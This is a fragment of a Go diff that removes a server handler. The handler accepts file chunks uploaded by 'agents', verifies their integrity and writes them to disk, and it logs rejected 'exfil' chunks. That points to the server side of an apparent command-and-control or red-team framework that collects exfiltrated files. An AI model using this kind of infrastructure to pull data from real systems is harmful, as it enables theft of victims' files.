-	if len(decoded) > MaxTransferChunkSize {
-		task.Result = fmt.Sprintf("ERROR: chunk too large (%d bytes, max %d)", len(decoded), MaxTransferChunkSize)
-		if saveErr := s.db.Save(task).Error; saveErr != nil {
-			slog.Error("Failed to save chunk size error", "task_id", task.ID, "error", saveErr)
-		}
-		slog.Warn("Oversized exfil chunk rejected", "agent_id", uuid, "task_id", task.ID, "size", len(decoded))
-		return true
-	}
-	if err := s.verifyAndCommitChain(uuid, task.ID, r.MAC, decoded); err != nil {
-		task.Result = fmt.Sprintf("ERROR: %v", err)
-		if saveErr := s.db.Save(task).Error; saveErr != nil {
-			slog.Error("Failed to save integrity error", "task_id", task.ID, "error", saveErr)
-		}
-		slog.Warn("File chunk integrity failure", "agent_id", uuid, "task_id", task.ID, "error", err)
-		return true
-	}
-	f, ferr := os.OpenFile(filePath, os.O_CREATE|os.O_WRONLY, 0600)
-	if ferr != nil {
-		task.Result = fmt.Sprintf("ERROR: open file failed: %v", ferr)
-		if len(task.Result) > MaxResultSize {
-			task.Result = truncateString(task.Result, MaxResultSize)
-		}
-		if saveErr := s.db.Save(task).Error; saveErr != nil {
-			slog.Error("Failed to save open file error", "task_id", task.ID, "error", saveErr)
-		}
-		return true
-	}
-	defer f.Close()
-	off := r.Offset
-	if off == 0 {
-		off = task.Offset
-	}
-	if off > 0 {
-		if _, err := f.Seek(off, 0); err != nil {
-			task.Result = fmt.Sprintf("ERROR: seek failed: %v", err)
-			if len(task.Result) > MaxResultSize {
-				task.Result = truncateString(task.Result, MaxResultSize)
-			}
-			if err := s.db.Save(task).Error; err != nil {
-				slog.Error("Failed to save "+logPrefix+" seek error", "task_id", task.ID, "error", err)
-			}
-			return true
-		}
-	}
-	if _, err := f.Write(decoded); err != nil {
-		task.Result = fmt.Sprintf("ERROR: write failed: %v", err)
-		if len(task.Result) > MaxResultSize {
-			task.Result = truncateString(task.Result, MaxResultSize)
-		}
-		if err := s.db.Save(task).Error; err != nil {
-			slog.Error("Failed to save "+logPrefix+" write error", "task_id", task.ID, "error", err)
-		}
-		return true
-	}
-	task.Result = fmt.Sprintf("%s: %s offset %d (%d bytes)", resultPrefix, filename, off, r.Size)
-	if len(task.Result) > MaxResultSize {
-		task.Result = truncateString(task.Result, MaxResultSize)
-	}
-	if err := s.db.Save(task).Error; err != nil {
-		slog.Error("Failed to save "+logPrefix+" success", "task_id", task.ID, "error", err)
-	}
-	slog.Info("File chunk "+logPrefix, "agent_id", uuid, "file", filename, "offset", off, "size", r.Size)
-	return false
 }
 
 // safeJoin verifies that joining base+name stays within base, preventing path traversal.
